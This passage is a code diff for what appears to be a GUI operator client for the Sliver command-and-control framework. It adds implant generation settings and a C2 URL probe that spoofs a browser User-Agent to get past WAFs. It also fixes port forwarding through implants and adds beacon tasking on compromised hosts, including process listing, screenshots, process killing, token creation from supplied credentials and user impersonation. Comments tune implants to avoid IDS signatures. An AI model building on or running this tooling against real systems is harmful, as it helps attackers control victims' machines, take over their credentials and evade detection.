+func (a *App) GetHTTPC2ProfileSummary(name string) (*HTTPC2ProfileSummary, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	cfg, err := client.GetHTTPC2ProfileByName(a.ctx, name)
+	if err != nil {
+		return nil, err
+	}
+	if cfg == nil {
+		return nil, fmt.Errorf("profile %q not found", name)
+	}
+	sum := &HTTPC2ProfileSummary{Name: cfg.Name}
+	if cfg.ImplantConfig != nil {
+		sum.UserAgent = cfg.ImplantConfig.UserAgent
+		sum.NonceQueryLength = cfg.ImplantConfig.NonceQueryLength
+		sum.NonceQueryChars = cfg.ImplantConfig.NonceQueryArgChars
+		if cfg.ImplantConfig.NonceQueryLength <= 0 {
+			// Sliver's httpclient.NonceQueryArgument calls secure.Intn(NonceQueryLength).
+			// Intn(0) panics inside the implant on first check-in - a broken
+			// profile is worse than no profile because it produces a build that
+			// crashes on target with no telemetry. Loud warning so the operator
+			// picks a different profile.
+			sum.Warnings = append(sum.Warnings, "NonceQueryLength=0 - implants built with this profile will panic on first HTTP request (secure.Intn: non-positive n). Fix the profile or pick a different one before generating.")
+		}
+		if cfg.ImplantConfig.NonceQueryArgChars == "" {
+			sum.Warnings = append(sum.Warnings, "NonceQueryArgChars is empty - nonce values will be blank.")
+		}
+		for _, h := range cfg.ImplantConfig.Headers {
+			if h == nil {
+				continue
+			}
+			sum.Headers = append(sum.Headers, HTTPC2HeaderEntry{
+				Method:      h.Method,
+				Name:        h.Name,
+				Value:       h.Value,
+				Probability: h.Probability,
+			})
+		}
+		// Show a plausible URI from the profile's path segments so operators
+		// recognise what their beacon will POST to. Sliver randomises segments
+		// per-request (each is a directory or file candidate); we list the
+		// first few Values verbatim, plus a joined example. Never assume more
+		// structure than HTTPC2PathSegment{ID, IsFile, Value} exposes.
+		if len(cfg.ImplantConfig.PathSegments) > 0 {
+			var dirs, files []string
+			for _, seg := range cfg.ImplantConfig.PathSegments {
+				if seg == nil || seg.Value == "" {
+					continue
+				}
+				if seg.IsFile {
+					if len(files) < 3 {
+						files = append(files, seg.Value)
+					}
+				} else {
+					if len(dirs) < 3 {
+						dirs = append(dirs, seg.Value)
+					}
+				}
+				if len(dirs) >= 3 && len(files) >= 3 {
+					break
+				}
+			}
+			var joined []string
+			joined = append(joined, dirs...)
+			if len(files) > 0 {
+				joined = append(joined, files[0])
+			}
+			if len(joined) > 0 {
+				sum.SampleURI = "/" + strings.Join(joined, "/")
+			}
+			sum.URISamples = append(dirs, files...)
+		}
+	}
+	return sum, nil
+}
+
+// TestC2Result captures a single reachability probe of a C2 / redirector URL.
+type TestC2Result struct {
+	OK          bool              `json:"ok"`
+	Status      int               `json:"status"`
+	StatusText  string            `json:"statusText"`
+	ElapsedMS   int64             `json:"elapsedMs"`
+	FinalURL    string            `json:"finalUrl"`
+	BodyPreview string            `json:"bodyPreview"`
+	Headers     map[string]string `json:"headers,omitempty"`
+	Error       string            `json:"error,omitempty"`
+	Note        string            `json:"note,omitempty"`
+}
+
+// TestC2URL probes a C2 (or redirector) URL from the teamserver-side to
+// confirm the beacon path is alive BEFORE the operator waits 30s for a build
+// that can't call home. HTTP(S) only - non-HTTP schemes get a friendly Note
+// instead of a probe (mtls/dns/wg require real handshakes we can't fake).
+//
+// Optional headers let the operator pre-flight a redirector header check
+// (e.g. `X-Request-ID: <shared secret>`) - the same one their HTTP C2 profile
+// will bake into the implant. Runs from the GUI *client* process, so it walks
+// the same network path the operator's machine will - including the SSH
+// tunnel if the URL points at 127.0.0.1 forwarded to the teamserver.
+func (a *App) TestC2URL(urlStr string, headers map[string]string) TestC2Result {
+	res := TestC2Result{Headers: map[string]string{}}
+	urlStr = strings.TrimSpace(urlStr)
+	if urlStr == "" {
+		res.Error = "no URL supplied"
+		return res
+	}
+	parsed, err := url.Parse(urlStr)
+	if err != nil {
+		res.Error = "invalid URL: " + err.Error()
+		return res
+	}
+	scheme := strings.ToLower(parsed.Scheme)
+	switch scheme {
+	case "http", "https":
+		// fall through to the probe
+	case "":
+		res.Error = "URL has no scheme - use http://, https://, mtls://, etc."
+		return res
+	default:
+		res.Note = fmt.Sprintf("scheme %q can't be HTTP-probed. For mtls/dns/wg/tcp-pivot, verify the listener directly on the teamserver (e.g. `ss -ltnp | grep :port`).", scheme)
+		return res
+	}
+
+	client := &http.Client{
+		Timeout: 8 * time.Second,
+		Transport: &http.Transport{
+			// Redirector / self-signed certs are the norm in lab setups; skip
+			// verification. This is a diagnostic probe, not a data channel.
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		},
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			// Follow up to 5 redirects; record the final URL below.
+			if len(via) >= 5 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
+	// Fall back to context.Background if the app hasn't been started (e.g.
+	// unit tests that construct &App{} directly). NewRequestWithContext panics
+	// on a nil ctx, and a nil ctx is not a bug worth crashing the app for.
+	ctx := a.ctx
+	if ctx == nil {
+		ctx = context.Background()
+	}
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, urlStr, nil)
+	if err != nil {
+		res.Error = err.Error()
+		return res
+	}
+	// A modern UA slips past most WAFs that fingerprint the default Go client.
+	if _, ok := headers["User-Agent"]; !ok {
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
+	}
+	for k, v := range headers {
+		if k = strings.TrimSpace(k); k != "" {
+			req.Header.Set(k, v)
+		}
+	}
+	start := time.Now()
+	resp, err := client.Do(req)
+	res.ElapsedMS = time.Since(start).Milliseconds()
+	if err != nil {
+		res.Error = err.Error()
+		return res
+	}
+	defer resp.Body.Close()
+	res.OK = resp.StatusCode > 0
+	res.Status = resp.StatusCode
+	res.StatusText = resp.Status
+	res.FinalURL = resp.Request.URL.String()
+	// Body preview capped at 400 bytes so a full HTML challenge page can't
+	// blow up the UI. Enough to spot "Just a moment", "cf-mitigated",
+	// "Cloudflare" or a bare cover-response.
+	buf := make([]byte, 400)
+	n, _ := io.ReadFull(resp.Body, buf)
+	res.BodyPreview = strings.ToValidUTF8(string(buf[:n]), "")
+	// Surface the handful of response headers that matter for redirector
+	// debugging without leaking every session cookie back to the UI.
+	for _, k := range []string{"Content-Type", "Content-Length", "Server", "Cf-Ray", "Cf-Cache-Status", "Cf-Mitigated", "X-Cache", "X-Powered-By"} {
+		if v := resp.Header.Get(k); v != "" {
+			res.Headers[k] = v
+		}
+	}
+	// A couple of read-at-a-glance interpretations for the frontend to render.
+	switch {
+	case resp.StatusCode == 401 || resp.StatusCode == 403:
+		res.Note = "Auth/header check likely failed. If a redirector expects a shared-secret header, add it below and retry."
+	case resp.StatusCode == 502 || resp.StatusCode == 503 || resp.StatusCode == 504:
+		res.Note = "Redirector reached the origin but origin is down. Check the C2 listener process on the teamserver."
+	case resp.StatusCode == 200 || resp.StatusCode == 404:
+		res.Note = "Reachable. 404 is often the C2 profile's cover page - expected for a bare probe."
+	case resp.StatusCode >= 300 && resp.StatusCode < 400:
+		res.Note = "Redirect chain - check FinalURL is what you expect."
+	}
+	return res
+}
+
+// ListenerOption is the richer form of ListenerC2Options, giving the frontend
+// enough context to render a useful label ("mtls (Job 2) → 127.0.0.1:8443")
+// instead of a bare URL. Kept parallel to ListenerC2Options so old callers
+// keep working; new UI should prefer this.
+type ListenerOption struct {
+	URL     string `json:"url"`
+	JobID   uint32 `json:"jobId"`
+	JobName string `json:"jobName"`
+	Scheme  string `json:"scheme"`
+	Host    string `json:"host"`
+	Port    uint32 `json:"port"`
+	// Label is a pre-formatted "scheme://host:port  (Job N)" the frontend can
+	// stick straight into a <option>. The backend builds it so every operator
+	// sees the same shape and it never disagrees with URL.
+	Label string `json:"label"`
+}
+
+// ListenerC2Details returns the same set as ListenerC2Options but with the
+// Job metadata attached, so the frontend can render disambiguating labels
+// and show which listener a URL belongs to.
+func (a *App) ListenerC2Details() ([]ListenerOption, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := client.RPC.GetJobs(a.ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	host := client.Config.LHost
+	out := []ListenerOption{}
+	for _, j := range resp.Active {
+		name := strings.ToLower(j.Name)
+		var scheme string
+		switch {
+		case strings.Contains(name, "mtls"):
+			scheme = "mtls"
+		case strings.Contains(name, "https"):
+			scheme = "https"
+		case strings.Contains(name, "http"):
+			scheme = "http"
+		case strings.Contains(name, "dns"):
+			scheme = "dns"
+		case strings.Contains(name, "wg"), strings.Contains(name, "wireguard"):
+			scheme = "wg"
+		default:
+			continue
+		}
+		u := fmt.Sprintf("%s://%s:%d", scheme, host, j.Port)
+		out = append(out, ListenerOption{
+			URL:     u,
+			JobID:   j.ID,
+			JobName: j.Name,
+			Scheme:  scheme,
+			Host:    host,
+			Port:    j.Port,
+			Label:   fmt.Sprintf("%s  (Job %d)", u, j.ID),
+		})
+	}
+	return out, nil
+}
+
 func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
 	client, err := a.requireClient()
 	if err != nil {
@@ -2045,6 +2795,26 @@ func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
 	}
 	if strings.TrimSpace(req.C2URL) == "" {
 		return GenerateResult{Error: "a C2 URL is required (select a listener or enter one)"}
+	}
+	// Guard against the "beacon panics on first check-in" pit trap: if the
+	// chosen HTTP C2 profile has NonceQueryLength <= 0, Sliver's implant
+	// crashes with `secure.Intn: non-positive n` before it ever calls home.
+	// Refuse the build with an actionable message instead - the operator
+	// otherwise gets a silent implant with no telemetry to debug against.
+	scheme := strings.ToLower(schemeOf(req.C2URL))
+	if scheme == "http" || scheme == "https" {
+		effective := strings.TrimSpace(req.HTTPC2Profile)
+		if effective == "" {
+			effective, _ = a.firstHTTPC2ProfileName()
+		}
+		if effective != "" {
+			if sum, sErr := a.GetHTTPC2ProfileSummary(effective); sErr == nil && sum != nil && sum.NonceQueryLength <= 0 {
+				return GenerateResult{Error: fmt.Sprintf(
+					"refusing to build: HTTP C2 profile %q has NonceQueryLength=0. Sliver's implant will panic on first check-in with `secure.Intn: non-positive n`. Pick a different profile in the Generate form, or fix the profile on the teamserver (positive NonceQueryLength, non-empty NonceQueryArgChars).",
+					effective,
+				)}
+			}
+		}
 	}
 	cfg := a.buildImplantConfig(req)
 	// Build names must be unique in the teamserver DB (UNIQUE constraint on
@@ -2073,12 +2843,12 @@ func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
 			return GenerateResult{Error: err.Error()}
 		}
 		if !autoName {
-			return GenerateResult{Error: fmt.Sprintf("a build named %q already exists — delete it in the Builds panel or choose another name", name)}
+			return GenerateResult{Error: fmt.Sprintf("a build named %q already exists - delete it in the Builds panel or choose another name", name)}
 		}
 		genReq.Name = fmt.Sprintf("%s-%s-%s", req.GOOS, req.GOARCH, randSuffix())
 	}
 	if err != nil {
-		return GenerateResult{Error: "build name keeps colliding after several tries — the teamserver may derive the build name from the config; delete old builds in the Builds panel and retry: " + err.Error()}
+		return GenerateResult{Error: "build name keeps colliding after several tries - the teamserver may derive the build name from the config; delete old builds in the Builds panel and retry: " + err.Error()}
 	}
 	if resp.File == nil {
 		return GenerateResult{Error: "server returned an empty build"}
@@ -2087,7 +2857,7 @@ func (a *App) GenerateImplant(req GenerateRequest) GenerateResult {
 	// save dialog here: doing so blocked this call (and kept the "Building…"
 	// spinner up) on a modal dialog that could open behind the window. Instead we
 	// return the build name and let the frontend offer "Save to disk", which
-	// calls RegenerateBuild(name) on a user click — a dialog raised by a direct
+	// calls RegenerateBuild(name) on a user click - a dialog raised by a direct
 	// gesture gets focus, and the spinner is already gone.
 	a.audit.log("generate", genReq.Name, fmt.Sprintf("%s/%s", req.GOOS, req.GOARCH))
 	return GenerateResult{Name: genReq.Name, File: genReq.Name}
@@ -2329,7 +3099,7 @@ func (a *App) socksHandleConn(ctx context.Context, client *sliverclient.Client, 
 //
 // NOTE: the remote target is sent as the first TunnelData frame so the implant
 // knows where to dial. Verify this handshake against your sliver v1.7.3 implant
-// on-device — if the implant expects the target elsewhere this is the one spot
+// on-device - if the implant expects the target elsewhere this is the one spot
 // to adjust; the byte-relay loop below is protocol-agnostic.
 
 type portfwdHandle struct {
@@ -2404,6 +3174,16 @@ func (a *App) runPortfwd(ctx context.Context, client *sliverclient.Client, sessi
 
 func (a *App) portfwdHandleConn(ctx context.Context, client *sliverclient.Client, sessionID, remote string, conn net.Conn) {
 	defer conn.Close()
+	// Parse the remote address before we create any server-side state so we can
+	// reject a bad address early.
+	host, portStr, splitErr := net.SplitHostPort(remote)
+	if splitErr != nil {
+		return
+	}
+	portNum, portErr := strconv.Atoi(portStr)
+	if portErr != nil || portNum <= 0 || portNum > 65535 {
+		return
+	}
 	rpcTunnel, err := client.RPC.CreateTunnel(ctx, &sliverpb.Tunnel{SessionID: sessionID})
 	if err != nil {
 		return
@@ -2415,9 +3195,32 @@ func (a *App) portfwdHandleConn(ctx context.Context, client *sliverclient.Client
 	}
 	var seq uint64
 
-	// First frame: tell the implant where to dial (see NOTE above).
-	_ = stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Data: []byte(remote), Sequence: seq})
+	// Bind the newly-created tunnel to the stream with an initial empty frame
+	// (the implant needs a frame on the stream before it will recognise the
+	// TunnelID). Then send the actual PortfwdReq protobuf so the implant knows
+	// where to dial - the previous "send remote as raw bytes" approach never
+	// triggered the outbound dial, so every forwarded connection hung.
+	if err := stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Sequence: seq}); err != nil {
+		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
+		return
+	}
 	seq++
+	portfwdResp, pfErr := client.RPC.Portfwd(ctx, &sliverpb.PortfwdReq{
+		Host:      host,
+		Port:      uint32(portNum),
+		Protocol:  sliverpb.PortFwdProtoTCP,
+		TunnelID:  tunnelID,
+		KeepAlive: 30,
+		Request:   &commonpb.Request{SessionID: sessionID},
+	})
+	if pfErr != nil {
+		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
+		return
+	}
+	if portfwdResp != nil && portfwdResp.Response != nil && portfwdResp.Response.Err != "" {
+		_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
+		return
+	}
 
 	// stream -> local conn
 	go func() {
@@ -2841,6 +3644,14 @@ func (a *App) buildImplantConfig(req GenerateRequest) *clientpb.ImplantConfig {
 		Format:           formatFromString(req.Format),
 		C2:               []*clientpb.ImplantC2{{URL: req.C2URL, Priority: 1}},
 		ObfuscateSymbols: false,
+		// Sensible defaults borrowed from the stock Sliver `generate` command.
+		// Leaving these at zero produces implants that reconnect with no
+		// backoff after any transport dropout - a tight retry loop that
+		// hammers the C2, floods logs, and paints a bright IDS signature.
+		// Long-poll HTTP requests also close immediately if PollTimeout=0.
+		ReconnectInterval:   60 * int64(time.Second),
+		PollTimeout:         360 * int64(time.Second),
+		MaxConnectionErrors: 1000,
 		// MTLS is always compiled in as a baseline transport. The generated
 		// implant's transports/session.go imports net/url, sync and sliverpb which
 		// only the MTLS/HTTP transports use; an implant that ends up with none of
@@ -2859,10 +3670,19 @@ func (a *App) buildImplantConfig(req GenerateRequest) *clientpb.ImplantConfig {
 		cfg.BeaconInterval = interval * int64(time.Second)
 		cfg.BeaconJitter = req.Jitter * int64(time.Second)
 	}
-	if hc2, _ := a.firstHTTPC2ProfileName(); hc2 != "" {
-		cfg.HTTPC2ConfigName = hc2
-	} else {
-		cfg.HTTPC2ConfigName = "default"
+	// Prefer the operator's chosen HTTP C2 profile; else fall back to whatever
+	// the teamserver has (first profile, or "default"). The chosen profile is
+	// what controls the URIs, headers (e.g. X-Request-ID), and user-agents baked
+	// into HTTP(S) implants - critical when a redirector gates on a header.
+	switch {
+	case strings.TrimSpace(req.HTTPC2Profile) != "":
+		cfg.HTTPC2ConfigName = strings.TrimSpace(req.HTTPC2Profile)
+	default:
+		if hc2, _ := a.firstHTTPC2ProfileName(); hc2 != "" {
+			cfg.HTTPC2ConfigName = hc2
+		} else {
+			cfg.HTTPC2ConfigName = "default"
+		}
 	}
 	switch strings.ToLower(schemeOf(req.C2URL)) {
 	case "http", "https":
@@ -2909,11 +3729,12 @@ func (a *App) DeleteImplantProfile(name string) error {
 // task completion with a timeout.
 
 type BeaconTaskResult struct {
-	TaskID string `json:"taskId"`
-	Status string `json:"status"` // "pending", "completed", "error"
-	Stdout string `json:"stdout"`
-	Stderr string `json:"stderr"`
-	Error  string `json:"error,omitempty"`
+	TaskID  string `json:"taskId"`
+	Status  string `json:"status"` // "pending", "completed", "error"
+	Stdout  string `json:"stdout"`
+	Stderr  string `json:"stderr"`
+	Error   string `json:"error,omitempty"`
+	CmdType string `json:"cmdType,omitempty"`
 }
 
 // ExecuteBeaconCommand queues a shell command on a beacon and polls for the result.
@@ -2973,7 +3794,7 @@ func (a *App) ExecuteBeaconCommand(beaconID, command string) BeaconTaskResult {
 // pollBeaconTask waits for a beacon task to complete, polling every 2 seconds up to 5 minutes.
 func (a *App) pollBeaconTask(beaconID, taskID string) BeaconTaskResult {
 	if taskID == "" {
-		return BeaconTaskResult{Status: "pending", TaskID: "", Error: "task queued — will execute on next beacon check-in"}
+		return BeaconTaskResult{Status: "pending", TaskID: "", Error: "task queued - will execute on next beacon check-in"}
 	}
 
 	client, err := a.requireClient()
@@ -2986,7 +3807,7 @@ func (a *App) pollBeaconTask(beaconID, taskID string) BeaconTaskResult {
 	for time.Now().Before(deadline) {
 		tasks, err := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
 		if err != nil {
-			return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: fmt.Sprintf("poll error: %v — task still queued", err)}
+			return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: fmt.Sprintf("poll error: %v - task still queued", err)}
 		}
 		for _, t := range tasks.Tasks {
 			if t.ID == taskID {
@@ -3015,7 +3836,7 @@ func (a *App) pollBeaconTask(beaconID, taskID string) BeaconTaskResult {
 	return BeaconTaskResult{
 		TaskID: taskID,
 		Status: "pending",
-		Error:  "task still pending — beacon has not checked in yet. It will execute on the next check-in.",
+		Error:  "task still pending - beacon has not checked in yet. It will execute on the next check-in.",
 	}
 }
 
@@ -3079,14 +3900,7 @@ func (a *App) ExecuteBeaconCommandAsync(beaconID, command string) BeaconTaskResu
 		taskID = resp.Response.TaskID
 	}
 
-	// Return immediately with the task ID. The frontend polls GetBeaconTasks for
-	// the result so the console never blocks waiting for a beacon check-in.
-	if taskID != "" {
-		return BeaconTaskResult{Status: "pending", TaskID: taskID}
-	}
-
-	// No task ID means the response came back directly (rare for beacons).
-	if resp.Stdout != nil || resp.Stderr != nil {
+	if taskID == "" && (resp.Stdout != nil || resp.Stderr != nil) {
 		return BeaconTaskResult{
 			Status: "completed",
 			Stdout: string(resp.Stdout),
@@ -3094,7 +3908,22 @@ func (a *App) ExecuteBeaconCommandAsync(beaconID, command string) BeaconTaskResu
 		}
 	}
 
-	return BeaconTaskResult{Status: "pending", Error: "command queued - waiting for beacon check-in"}
+	if taskID == "" {
+		tasks, terr := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
+		if terr == nil && tasks != nil && len(tasks.Tasks) > 0 {
+			newest := tasks.Tasks[0]
+			for _, t := range tasks.Tasks[1:] {
+				if t.CreatedAt > newest.CreatedAt {
+					newest = t
+				}
+			}
+			if newest.State == "pending" || newest.State == "" {
+				taskID = newest.ID
+			}
+		}
+	}
+
+	return BeaconTaskResult{Status: "pending", TaskID: taskID}
 }
 
 // GetBeaconTaskResults retrieves all task results for a beacon.
@@ -3150,7 +3979,7 @@ func (a *App) GetBeaconTasks(beaconID string) ([]BeaconTaskView, error) {
 }
 
 // GetBeaconTaskResult fetches a single beacon task's full content. GetBeaconTasks
-// only returns task summaries (no Response body) — the actual output requires the
+// only returns task summaries (no Response body) - the actual output requires the
 // GetBeaconTaskContent RPC. The frontend poller calls this to display results.
 func (a *App) GetBeaconTaskResult(taskID string) (BeaconTaskView, error) {
 	client, err := a.requireClient()
@@ -3176,4 +4005,458 @@ func (a *App) GetBeaconTaskResult(taskID string) (BeaconTaskView, error) {
 		}
 	}
 	return v, nil
+}
+
+// BeaconNativeCommand dispatches a command to its native gRPC RPC instead of
+// wrapping it in cmd.exe /c via Execute. This is critical for beacons running
+// inside hollowed processes where shell execution hangs.
+func (a *App) BeaconNativeCommand(beaconID, command, argsStr string) BeaconTaskResult {
+	client, err := a.requireClient()
+	if err != nil {
+		return BeaconTaskResult{Error: err.Error()}
+	}
+	// Timeout in NANOSECONDS - this is the task's server-side timeout,
+	// NOT the gRPC deadline. Sliver's default is 60s. Without this the
+	// beacon may execute the handler but drop the response.
+	req := &commonpb.Request{
+		BeaconID: beaconID,
+		Async:    true,
+		Timeout:  int64(60 * time.Second),
+	}
+	var taskID string
+
+	switch command {
+	case "whoami":
+		resp, err := client.RPC.CurrentTokenOwner(a.ctx, &sliverpb.CurrentTokenOwnerReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "ps":
+		resp, err := client.RPC.Ps(a.ctx, &sliverpb.PsReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "pwd":
+		resp, err := client.RPC.Pwd(a.ctx, &sliverpb.PwdReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "cd":
+		path := strings.TrimSpace(argsStr)
+		if path == "" {
+			return BeaconTaskResult{Error: "usage: cd <path>"}
+		}
+		resp, err := client.RPC.Cd(a.ctx, &sliverpb.CdReq{Path: path, Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "ls":
+		path := strings.TrimSpace(argsStr)
+		if path == "" {
+			path = "."
+		}
+		resp, err := client.RPC.Ls(a.ctx, &sliverpb.LsReq{Path: path, Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "netstat":
+		resp, err := client.RPC.Netstat(a.ctx, &sliverpb.NetstatReq{
+			TCP: true, UDP: true, IP4: true, IP6: true, Listening: true,
+			Request: req,
+		})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "env":
+		resp, err := client.RPC.GetEnv(a.ctx, &sliverpb.EnvReq{Name: "", Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "ifconfig":
+		resp, err := client.RPC.Ifconfig(a.ctx, &sliverpb.IfconfigReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "screenshot":
+		resp, err := client.RPC.Screenshot(a.ctx, &sliverpb.ScreenshotReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "kill", "terminate":
+		pid, perr := strconv.Atoi(strings.TrimSpace(argsStr))
+		if perr != nil {
+			return BeaconTaskResult{Error: "usage: kill <pid>"}
+		}
+		resp, err := client.RPC.Terminate(a.ctx, &sliverpb.TerminateReq{
+			Pid: int32(pid), Force: false, Request: req,
+		})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "rev2self":
+		resp, err := client.RPC.RevToSelf(a.ctx, &sliverpb.RevToSelfReq{Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "make-token":
+		parts := strings.SplitN(strings.TrimSpace(argsStr), " ", 3)
+		if len(parts) < 3 {
+			return BeaconTaskResult{Error: "usage: make-token <domain> <username> <password>"}
+		}
+		resp, err := client.RPC.MakeToken(a.ctx, &sliverpb.MakeTokenReq{
+			Domain: parts[0], Username: parts[1], Password: parts[2],
+			LogonType: 9, Request: req,
+		})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "impersonate":
+		username := strings.TrimSpace(argsStr)
+		if username == "" {
+			return BeaconTaskResult{Error: "usage: impersonate <user>"}
+		}
+		resp, err := client.RPC.Impersonate(a.ctx, &sliverpb.ImpersonateReq{
+			Username: username, Request: req,
+		})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	case "mkdir":
+		path := strings.TrimSpace(argsStr)
+		if path == "" {
+			return BeaconTaskResult{Error: "usage: mkdir <path>"}
+		}
+		resp, err := client.RPC.Mkdir(a.ctx, &sliverpb.MkdirReq{Path: path, Request: req})
+		if err != nil {
+			return BeaconTaskResult{Error: err.Error()}
+		}
+		if resp.Response != nil {
+			taskID = resp.Response.TaskID
+		}
+
+	default:
+		return BeaconTaskResult{Error: "not a native command: " + command}
+	}
+
+	if taskID == "" {
+		return BeaconTaskResult{Error: "RPC returned no task ID for " + command}
+	}
+	return BeaconTaskResult{Status: "pending", TaskID: taskID, CmdType: command}
+}
+
+// GetBeaconNativeResult fetches a beacon task's content and parses the response
+// bytes according to the original command type. Returns human-readable output.
+//
+// Sliver has a task-state inconsistency: GetBeaconTasks (summary) reports
+// "completed" as soon as the beacon ACKs receipt, but GetBeaconTaskContent
+// (full body) still shows state="sent" and 0 response bytes until the beacon
+// actually finishes and delivers the payload on a subsequent check-in.
+// We poll here for up to 90 seconds waiting for the real completion.
+func (a *App) GetBeaconNativeResult(taskID, cmdType string) (BeaconTaskView, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return BeaconTaskView{}, err
+	}
+
+	var t *clientpb.BeaconTask
+	deadline := time.Now().Add(90 * time.Second)
+	pollInterval := 2 * time.Second
+	for {
+		t, err = client.RPC.GetBeaconTaskContent(a.ctx, &clientpb.BeaconTask{ID: taskID})
+		if err != nil {
+			return BeaconTaskView{}, err
+		}
+		stateLower := strings.ToLower(t.State)
+		trulyDone := (strings.Contains(stateLower, "complete") || stateLower == "done") && len(t.Response) > 0
+		hardFail := strings.Contains(stateLower, "fail") || strings.Contains(stateLower, "cancel")
+		if trulyDone || hardFail {
+			break
+		}
+		if time.Now().After(deadline) {
+			break
+		}
+		time.Sleep(pollInterval)
+	}
+
+	v := BeaconTaskView{ID: t.ID, State: t.State, Description: t.Description}
+	if t.CreatedAt > 0 {
+		v.CreatedAt = time.Unix(t.CreatedAt, 0).Format("15:04:05")
+	}
+	if t.CompletedAt > 0 {
+		v.CompletedAt = time.Unix(t.CompletedAt, 0).Format("15:04:05")
+	}
+	if len(t.Response) > 0 {
+		v.Response = formatNativeResponse(t.Response, cmdType)
+	} else {
+		v.Response = fmt.Sprintf("[diagnostic] task %s state=%q cmdType=%s response=0 bytes description=%q\n"+
+			"[hint] Native RPC returned no data. Try `shell %s` as fallback - that goes through cmd.exe /c\n"+
+			"and tests whether the transport works at all. If shell also empty, the beacon can pick up tasks\n"+
+			"but responses cannot flow back (likely tunnel/network problem, not command-specific).",
+			t.ID[:8], t.State, cmdType, t.Description, cmdType)
+	}
+	return v, nil
+}
+
+// BeaconShellFallback dispatches a command via cmd.exe /c on the beacon.
+// Used when the frontend wants to explicitly bypass native RPCs and test
+// whether the transport layer works at all. Returns the same task ID format
+// so the existing polling infrastructure can pick up the result.
+func (a *App) BeaconShellFallback(beaconID, command string) BeaconTaskResult {
+	r := a.ExecuteBeaconCommandAsync(beaconID, command)
+	r.CmdType = "shell-fallback"
+	return r
+}
+
+func formatNativeResponse(data []byte, cmdType string) string {
+	// Helper: check commonpb.Response for RPC-level errors
+	checkErr := func(r *commonpb.Response) string {
+		if r != nil && r.Err != "" {
+			return "[error] " + r.Err
+		}
+		return ""
+	}
+
+	switch cmdType {
+	case "whoami":
+		var resp sliverpb.CurrentTokenOwner
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			if resp.Output != "" {
+				return resp.Output
+			}
+		}
+		// Field 2 (Output/string) aligns with Execute.Stdout (bytes) - try fallback
+		stdout, _ := parseExecuteResponse(data)
+		if s := strings.TrimSpace(stdout); s != "" && s != "(no output)" {
+			return s
+		}
+
+	case "ps":
+		var resp sliverpb.Ps
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			var out strings.Builder
+			out.WriteString("PID     PPID    OWNER                EXECUTABLE\n")
+			for _, p := range resp.Processes {
+				owner := p.Owner
+				if len(owner) > 20 {
+					owner = owner[:20]
+				}
+				out.WriteString(fmt.Sprintf("%-8d%-8d%-21s%s\n", p.Pid, p.Ppid, owner, p.Executable))
+			}
+			return out.String()
+		}
+
+	case "pwd", "cd":
+		var resp sliverpb.Pwd
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
